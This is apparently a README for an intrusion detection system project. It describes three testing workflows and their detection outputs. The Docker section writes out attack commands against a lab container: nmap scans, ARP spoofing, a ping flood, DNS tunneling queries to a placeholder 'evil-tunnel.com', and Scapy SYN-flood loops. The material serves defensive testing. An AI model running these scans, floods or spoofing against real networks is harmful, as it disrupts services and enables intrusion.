# IDS Testing Workflows - Complete Guide

## Overview
The Network Intrusion Detection System has **3 main testing approaches**, each serving different purposes:

---

## 🔬 Workflow 1: Synthetic Python Testing (test_dynamic_ids.py)

### Purpose
Fast development testing with randomized synthetic attacks

### How It Works
```bash
cd ids/
python3 test_dynamic_ids.py
```

### What Happens
1. **Generates synthetic packets** using Scapy (no Docker needed)
2. **Creates random attacks**:
   - Port scans (random ports, random intensity)
   - SYN floods (random packet counts)
   - ICMP floods (random timing)
   - DNS tunneling (random hex payloads)
3. **Writes PCAPs** to `pcaps/` folder
4. **Analyzes with IDS** (both signature + anomaly detection)
5. **Generates visualizations** (6 charts)
6. **Creates HTML report** in `outputs/reports/`

### Advantages
- ⚡ **Fast** (runs in ~10 seconds)
- 🎲 **Randomized** (different results each time)
- 🛠️ **No Docker required**
- 📊 **Full reporting** (charts + HTML)

### Use Cases
- Quick testing during development
- Validating detection algorithms
- Generating demo reports

---

## 🎭 Workflow 2: Interactive Terminal Demo (demo_terminal_attacks.py)

### Purpose
Live attack demonstrations for presentations

### How It Works
```bash
cd ids/
python3 demo_terminal_attacks.py
```

### What Happens
1. **Interactive menu** with attack options:
   - Port Scan (nmap-style)
   - SYN Flood Attack
   - ICMP Ping Flood
   - DNS Tunneling
2. **Real-time visualization** of attack progress
3. **Immediate IDS analysis** and alert display
4. **Individual or batch execution**

### Advantages
- 🎪 **Interactive** (great for demos)
- 👀 **Visual feedback** (watch attacks happen)
- 🎯 **Focused testing** (one attack at a time)
- 📝 **Educational** (shows how each attack works)

### Use Cases
- Live demonstrations
- Teaching network security concepts
- Showcasing IDS capabilities
- Quick manual testing

---

## 🐳 Workflow 3: Docker Comprehensive Testing (workflow_docker_comprehensive.py)

### Purpose
**MOST REALISTIC** - Real network environment with actual attack tools

### How It Works
```bash
cd ids/
python3 workflow_docker_comprehensive.py
```

### Architecture
```
┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│  Attacker   │────▶│   Victim    │◀────│     IDS     │
│ Container   │     │  Container  │     │  Container  │
│             │     │             │     │             │
│ - nmap      │     │ - tcpdump   │     │ - Analysis  │
│ - scapy     │     │ - services  │     │ - Detection │
│ - hping3    │     │             │     │             │
│ - dig       │     │             │     │             │
└─────────────┘     └─────────────┘     └─────────────┘
      │                    │                    │
      └────────────────────┴────────────────────┘
                   Bridge Network
                   (10.0.0.0/24)
```

### What Happens

#### Phase 1: Signature-Based Attacks
```bash
# Real nmap port scan
nmap -sS 10.0.0.30 -p 1-100

# Real SYN scan (aggressive)
nmap -sS -T5 10.0.0.30

# ARP spoofing
arpspoof -i eth0 -t 10.0.0.30 10.0.0.1

# ICMP flood (120 packets)
ping -f -c 120 10.0.0.30

# DNS tunneling (15 suspicious queries)
dig @8.8.8.8 <hex-data>.evil-tunnel.com
```

#### Phase 2: Anomaly-Based Attacks
```python
# High port entropy (Scapy)
for port in random.sample(range(1, 65535), 100):
    send(IP(dst=target)/TCP(dport=port, flags="S"))

# Traffic volume spike
for i in range(50):
    send(IP(dst=target)/TCP(dport=random_port, flags="S"))

# Distributed port scan
for port in [low_ports + high_ports]:
    send(IP(dst=target)/TCP(dport=port, flags="S"))
```

#### Phase 3: Timing Anomaly Attack
```python
# Irregular burst patterns
while True:
    # Burst 1
    send_burst(50 packets)
    sleep(5)
    # Burst 2
    send_burst(50 packets)
    sleep(10)
    # Burst 3
    send_burst(50 packets)
```

### Traffic Capture
- **Real tcpdump** running in victim container
- **Captures actual network packets** (not synthetic)
- **Saves PCAP**: `pcaps/docker_comprehensive_capture.pcap`

### Detection & Analysis
1. **IDS analyzes captured PCAP**
2. **Detects all attack types**:
   - PORT_SCAN: ~35 alerts
   - SYN_FLOOD: 1 alert
   - ICMP_FLOOD: 1 alert
   - DNS_TUNNEL: 15 alerts
   - HIGH_PORT_ENTROPY: 11 alerts
3. **Generates full report** with 63 total alerts

### Advantages
- 🌐 **Most realistic** (actual network traffic)
- 🔧 **Real tools** (nmap, arpspoof, hping3)
- 📡 **True packet capture** (tcpdump)
- 🎯 **Production-ready testing**
- 🔍 **Complete attack suite**

### Use Cases
- Final validation before deployment
- Realistic penetration testing
- Demonstrating production readiness
- Research and development

---

## 📊 Comparison Matrix

| Feature | Synthetic (test_dynamic_ids) | Terminal Demo | Docker Comprehensive |
|---------|------------------------------|---------------|---------------------|
| **Speed** | ⚡ Fast (~10s) | ⚡ Fast (~5s) | 🐌 Slower (~60s) |
| **Realism** | Low (synthetic) | Low (synthetic) | 🔥 High (real traffic) |
| **Setup** | None | None | Docker required |
| **Randomization** | ✅ Yes | ❌ Fixed | ✅ Yes |
| **Interactive** | ❌ No | ✅ Yes | ❌ No |
| **Attack Tools** | Scapy only | Scapy only | nmap, hping3, arpspoof |
| **Network** | Fake IPs | Fake IPs | Real containers |
| **PCAP Source** | Generated | Generated | Captured (tcpdump) |
| **Best For** | Development | Demos | Production validation |

---

## 🎯 Quick Start Commands

### Synthetic Testing (Fast)
```bash
cd ids/
python3 test_dynamic_ids.py
# Opens report automatically
```

### Terminal Demo (Interactive)
```bash
cd ids/
python3 demo_terminal_attacks.py
# Follow interactive menu
```

### Docker Testing (Realistic)
```bash
cd ids/
python3 workflow_docker_comprehensive.py
# Takes ~60 seconds, opens report
```

---

## 📈 Expected Results

### All Workflows Generate
1. **PCAP files** in `pcaps/`
2. **Alert logs** in `outputs/logs/alerts.log`
3. **Metrics JSON** in `outputs/logs/evaluation_results.json`
4. **6 Visualizations** in `outputs/visualizations/`
5. **HTML Report** in `outputs/reports/ids_report.html`

### Typical Alert Counts
- **Synthetic**: 30-50 alerts (varies due to randomization)
- **Terminal Demo**: 10-20 alerts (focused attacks)
- **Docker**: 60-70 alerts (comprehensive suite)

---

## 🔍 Detection Capabilities

All workflows test these detection methods:

### Signature-Based
- ✅ **PORT_SCAN** - Tracks unique ports per IP
- ✅ **SYN_FLOOD** - Monitors SYN/ACK ratio
- ✅ **ARP_SPOOF** - Detects MAC changes (Docker only)
- ✅ **ICMP_FLOOD** - Sliding window rate limiting
- ✅ **DNS_TUNNEL** - Long subdomain + hex pattern detection

### Anomaly-Based
- ✅ **HIGH_PORT_ENTROPY** - Shannon entropy calculation
- ✅ **TRAFFIC_VOLUME_ANOMALY** - Packet/byte rate z-scores
- ✅ **TIMING_ANOMALY** - Inter-arrival time deviation

---

## 🎓 Recommendation

**For Your Demo:**
1. **Start with Terminal Demo** - Show individual attacks interactively
2. **Then run Docker Comprehensive** - Show realistic full test
3. **Show the generated report** - Professional HTML with all detections

This gives the best demonstration of:
- Individual attack concepts (Terminal Demo)
- Production readiness (Docker Comprehensive)
- Professional reporting (HTML Report)

---

## 🐛 Troubleshooting

### Docker Workflow Not Working
```bash
# Check containers
docker ps -a

# Rebuild if needed
cd ..
docker-compose down
docker-compose build
docker-compose up -d
```

### Baseline Model Missing
```bash
# Anomaly detection won't work without it
# Generate new baseline (Docker only):
cd ids/
python3 << EOF
from enhanced_ids import EnhancedIDS
ids = EnhancedIDS(use_anomaly_detection=True)
# Will auto-load if baseline_model.pkl exists
EOF
```

### Report Not Opening
```bash
# Manually open
open ids/outputs/reports/ids_report.html
# Or in browser:
# file:///path/to/ids/outputs/reports/ids_report.html
```

---

## 📝 Summary

You now have **three powerful ways** to test your IDS:

1. **test_dynamic_ids.py** - Fast synthetic testing
2. **demo_terminal_attacks.py** - Interactive demonstrations (NEW!)
3. **workflow_docker_comprehensive.py** - Realistic production testing

Each serves a unique purpose in your testing and demonstration arsenal! 🛡️
